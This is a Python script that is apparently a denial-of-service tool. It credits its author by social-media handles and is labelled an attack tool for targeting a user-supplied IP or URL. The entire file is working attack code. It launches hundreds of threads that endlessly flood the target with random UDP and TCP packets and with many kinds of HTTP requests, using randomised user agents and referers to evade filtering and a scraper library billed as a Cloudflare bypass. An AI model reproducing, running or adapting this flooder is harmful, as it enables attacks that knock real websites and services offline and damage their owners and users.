import os
import socket
import random
import threading
import time
import json
from urllib.parse import urlparse

try:
    import requests
    import httpx
    import cloudscraper
    import urllib.request
    import urllib3
    from user_agent import generate_user_agent
except:
    os.system("pip install requests httpx cloudscraper urllib3 user_agent")
    import requests
    import httpx
    import cloudscraper
    import urllib.request
    import urllib3
    from user_agent import generate_user_agent

os.system('cls' if os.name == 'nt' else 'clear')

print('\033[1;31m' + """
⠀⠀⠀⠀⢀⠀⢀⣼⣷⣤⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⡄⠀
⠀⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⠀⠀⠀⣿⣿⣿⣿⣿⡼⣿⣿⣿⣿⣷⣿⣿⠋⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⡟⠛
⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣝⣿⣽⣿⣿⣿⠿⣏⣉⡍⠉⠉⠉⠉⠙⠛⠻⠿⠿⠿⠿⣿⣿⣿⡇⠀
⠘⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣩⣿⣿⣿⣿⣿⣦⣈⣻⣃⣠⠶⠒⠒⠒⠒⠒⠛⠛⠛⠛⠛⠋⠉⠁⠀
⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡿⣾⠋⠀⠀⣿⠃⠀⠀⠈⢳⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣷⣿⣄⠀⠀⠹⣆⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⠶⢤⣬⣧⣤⠶⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⡿⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⠛⠛⠛⣿⣿⣿⣿⠣⢾⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀
""" + '\033[0m')

# معلومات المطور
print('\033[1;33m' + """
══════════════[ brute force tool ]══════════════
Telegram : @v_9_k_e
Instagram: o_l_l_l1
GitHub   : MohsenAltayar
Tools    : Attack on users IP
══════════════════════════════════════════════
""" + '\033[0m')

F = '\033[2;32m'
C = '\033[2;35m'
Y = '\033[1;34m'
Z = '\033[1;31m'
X = '\033[1;33m'

host_input = input(f'{F}({C}1{F}) {Y} Enter the link or IP: {Z}').strip()
parsed = urlparse(host_input)
host = parsed.hostname or host_input
is_http = parsed.scheme in ['http', 'https']

try:
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print(f"{Z}[✘] Unable to reach : {host_input}")
    exit()

if parsed.port:
    port = parsed.port
else:
    port = int(input(f'{F}({C}2{F}) {Y} Enter the port  (Port): {Z}'))

if not is_http:
    host_input = f"http://{host}:{port}"
    is_http = True  

times = int(input(f'{F}({C}3{F}) Number of packages per batch (500–5000): {Z}'))
thread_count = int(input(f'{F}({C}4{F}) Number of threads (example: 300): {Z}'))

print(f"{F}[✔] Launching {thread_count} attack threads on {ip}:{port}")
print(X + '═════════════════════════════════════')

def get_random_headers():
    return {
        "User-Agent": generate_user_agent(),
        "Referer": random.choice([
            "https://google.com", "https://youtube.com", "https://t.co", "https://bing.com"
        ]),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

def hybrid_attack():
    udp_data = random._urandom(2048)
    tcp_data = random._urandom(4096)
    addr = (ip, port)

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(times):
                s.sendto(udp_data, addr)
            print(f"{F}[UDP🔥] Sent {times}")
        except:
            print(f"{Z}[✘] UDP Error")

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(addr)
            for _ in range(times):
                s.send(tcp_data)
            s.close()
            print(f"{C}[TCP⚡] Sent {times}")
        except:
            print(f"{Z}[✘] TCP Error")

        url = host_input
        headers = get_random_headers()
        payload = {"data": "X" * random.randint(100, 1000)}
        json_payload = json.dumps(payload)
        files = {'file': ('fake.txt', b'FAKE FILE CONTENT')}

        try:
            requests.get(url, headers=headers, timeout=2)
            print(f"{Y}[HTTP🌐] GET sent")
        except:
            pass

        try:
            requests.post(url, headers=headers, data=payload, timeout=2)
            print(f"{C}[POST📩] sent")
        except:
            pass

        try:
            requests.post(url, headers=headers, json=payload, timeout=2)
            print(f"{X}[JSON🧬] sent")
        except:
            pass

        try:
            requests.post(url, headers=headers, files=files, timeout=2)
            print(f"{F}[FILE📎] sent")
        except:
            pass

        try:
            requests.head(url, headers=headers, timeout=2)
            print(f"{Y}[HEAD🔍] sent")
        except:
            pass

        try:
            requests.options(url, headers=headers, timeout=2)
            print(f"{Y}[OPTIONS⚙️] sent")
        except:
            pass

        try:
            with httpx.Client(http2=True, timeout=2) as client:
                client.get(url, headers=headers)
            print(f"{C}[HTTP2🚀] sent")
        except:
            pass

        try:
            scraper = cloudscraper.create_scraper()
            scraper.get(url, headers=headers)
            print(f"{F}[CF🔒] bypass sent")
        except:
            pass

        try:
            req = urllib.request.Request(url, headers=headers)
            urllib.request.urlopen(req, timeout=2)
            print(f"{X}[urllib📡] sent")
        except:
            pass

        try:
            http = urllib3.PoolManager()
            http.request("GET", url, headers=headers)
            print(f"{F}[urllib3📶] sent")
        except:
            pass

for _ in range(thread_count):
    t = threading.Thread(target=hybrid_attack)
    t.start()